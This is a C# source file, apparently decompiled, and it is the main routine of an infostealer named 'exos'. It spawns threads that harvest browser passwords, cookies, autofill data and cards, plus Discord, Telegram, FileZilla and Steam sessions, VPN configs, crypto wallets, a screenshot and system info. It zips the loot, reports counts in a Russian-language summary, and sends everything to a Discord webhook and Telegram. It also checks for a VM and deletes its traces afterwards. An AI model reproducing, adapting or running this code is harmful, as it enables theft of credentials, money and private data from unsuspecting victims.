using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using Ionic.Zip;
using Ionic.Zlib;
using TelegramAPI;
using exos.utils;

namespace exos;

internal class MainMenu
{
	public static void Main(string[] args)
	{
		if (File.Exists(Helper.ExploitDir) || Process.GetProcessesByName(Process.GetCurrentProcess().ProcessName).Length != 1)
		{
			return;
		}
		try
		{
			Directory.CreateDirectory(Helper.ExploitDir);
			List<Thread> list = new List<Thread>();
			list.Add(new Thread((ThreadStart)delegate
			{
				Files.GetFiles();
			}));
			list.Add(new Thread((ThreadStart)delegate
			{
				Browsers.Start();
			}));
			list.Add(new Thread((ThreadStart)delegate
			{
				Discord.WriteDiscord();
				FileZilla.GetFileZilla();
				Telegram.GetTelegramSessions();
				Vime.Get();
			}));
			list.Add(new Thread((ThreadStart)delegate
			{
				Screen.GetScreen();
				ProcessList.WriteProcesses();
				SystemInfo.GetSystem();
			}));
			list.Add(new Thread((ThreadStart)delegate
			{
				ProtonVPN.Save();
				OpenVPN.Save();
				NordVPN.Save();
				Steam.SteamGet();
			}));
			list.Add(new Thread((ThreadStart)delegate
			{
				StartWallets.Start();
			}));
			foreach (Thread item in list)
			{
				item.Start();
			}
			foreach (Thread item2 in list)
			{
				item2.Join();
			}
			string text = Helper.ExploitDir + "\\[" + GeoGet.Geo() + "] " + Environment.MachineName + " " + Environment.UserName + "(" + Helper.dateLog + ").zip";
			using (ZipFile zipFile = new ZipFile(Encoding.GetEncoding("cp866")))
			{
				zipFile.ParallelDeflateThreshold = -1L;
				zipFile.UseZip64WhenSaving = Zip64Option.Always;
				zipFile.CompressionLevel = CompressionLevel.Default;
				zipFile.Comment = "\n  /$$$$$$$$                                /$$$$$$   /$$                         /$$\n | $$_____/                               /$$__  $$ | $$                        | $$\n | $$       /$$   /$$  /$$$$$$   /$$$$$$$| $$  \\__//$$$$$$    /$$$$$$   /$$$$$$ | $$\n | $$$$$   |  $$ /$$/ /$$__  $$ /$$_____/|  $$$$$$|_  $$_/   /$$__  $$ |____  $$| $$\n | $$__/    \\  $$$$/ | $$  \\ $$|  $$$$$$  \\____  $$ | $$    | $$$$$$$$  /$$$$$$$| $$\n | $$        >$$  $$ | $$  | $$ \\____  $$ /$$  \\ $$ | $$ /$$| $$_____/ /$$__  $$| $$\n | $$$$$$$$ /$$/\\  $$|  $$$$$$/ /$$$$$$$/|  $$$$$$/ |  $$$$/|  $$$$$$$|  $$$$$$$| $$\n |________/|__/  \\__/ \\______/ |_______/  \\______/   \\___/   \\_______/ \\_______/|__/\n              discord: levinov1337          \nCookie: Browsers\\Cookie_(name)";
				zipFile.AddDirectory(Helper.ExploitDir);
				zipFile.Save(text);
			}
			string mssgBody = "```✅ Новый лог в панели! - " + Environment.MachineName + " " + Environment.UserName + "\n ================================\n \ud83c\udfae " + SystemInfo.GetSystemVersion() + "\n \ud83d\udcb8 Воркер - " + DiscordWebhook.worker + "\n ⚙ Виртуалка - " + checkvm() + "\n \ud83c\udf10 IP - " + GetLocalIPAddress() + "\n \ud83c\udf10 GEO - [" + GeoGet.Geo() + "]\n ================================\n \ud83d\udd10 Пароли - " + Counting.Passwords + "\n \ud83c\udf6a Куки - " + Counting.Cookies + "\n ✉\ufe0f Формы - " + Counting.AutoFill + "\n \ud83d\udcb3 Карты - " + Counting.CreditCards + "\n \ud83d\udcc1 Файлы - " + Counting.FileGrabber + ((Counting.Discord > 0) ? "\n \ud83c\udf0c Дискорд" : "") + ((Counting.Wallets > 0) ? "\n \ud83e\uddca Холодки" : "") + ((Counting.Telegram > 0) ? "\n \ud83d\udca7 Телеграмм" : "") + ((Counting.Steam > 0) ? "\n \ud83d\udd25 Стим" : "") + "\n ================================" + ((Counting.NordVPN > 0) ? "\n   NordVPN" : "") + ((Counting.OpenVPN > 0) ? "\n   OpenVPN" : "") + ((Counting.ProtonVPN > 0) ? "\n   ProtonVPN" : "") + "\n ================================```\n" + URLSearcher.GetDomainDetect(Helper.ExploitDir + "\\Browsers\\");
			string filename = "[" + GeoGet.Geo() + "] " + Environment.MachineName + "." + Environment.UserName + ".zip";
			string fileformat = "zip";
			string filepath = text;
			string application = "";
			try
			{
				DiscordWebhook.SendFile(mssgBody, filename, fileformat, filepath, application);
				TelegramAPI.Telegram.messagelog();
				TelegramAPI.Telegram.TelegramAPI(text);
				DiscordWebhook.SendOtstuk(mssgBody);
			}
			catch
			{
				TelegramAPI.Telegram.TelegramAPI(text);
				DiscordWebhook.Send("Вебхук не может отправить большой лог!");
				DiscordWebhook.SendOtstuk(mssgBody);
			}
			Finish();
		}
		catch (Exception value)
		{
			Console.WriteLine(value);
		}
	}

	public static string GetLocalIPAddress()
	{
		IPAddress[] addressList = Dns.GetHostEntry(Dns.GetHostName()).AddressList;
		foreach (IPAddress iPAddress in addressList)
		{
			if (iPAddress.AddressFamily == AddressFamily.InterNetwork)
			{
				return iPAddress.ToString();
			}
		}
		throw new Exception("Не удалось найти IP-адрес.");
	}

	public static string checkvm()
	{
		string path = Environment.GetEnvironmentVariable("SystemRoot") ?? "C:\\Windows";
		if (!File.Exists(Path.Combine(path, "System32", "vmGuestLib.dll")) && !File.Exists(Path.Combine(path, "vboxmrxnp.dll")))
		{
			return "Нет";
		}
		return "Да";
	}

	private static void Finish()
	{
		Thread.Sleep(35000);
		Directory.Delete(Helper.ExploitDir + "\\", recursive: true);
		Environment.Exit(0);
	}
}
